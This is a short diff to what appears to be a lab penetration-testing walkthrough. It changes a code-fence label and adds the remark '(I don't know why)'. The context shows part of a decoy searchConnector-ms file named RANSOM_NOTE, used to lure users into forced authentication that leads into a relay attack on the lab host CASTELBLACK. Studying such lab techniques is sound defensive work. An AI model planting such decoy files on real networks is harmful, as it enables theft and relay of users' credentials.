@@ -44,7 +44,7 @@ If we wait a little while and get lucky, a user will take an interest in the ran
 
 
 Alternatively, we can create such a file (`RANSOM_NOTE.searchConnector-ms`) ourselves:
-```xml
+```
 <?xml version="1.0" encoding="UTF-8"?>
 <searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
     <description>Microsoft Outlook</description>
@@ -58,6 +58,7 @@ Alternatively, we can create such a file (`RANSOM_NOTE.searchConnector-ms`) ours
     </simpleLocation>
 </searchConnectorDescription>
 ```
+(I don't know why)
 
 ### Forced Authentication & Relay
 So now we have our target: CASTELBLACK.
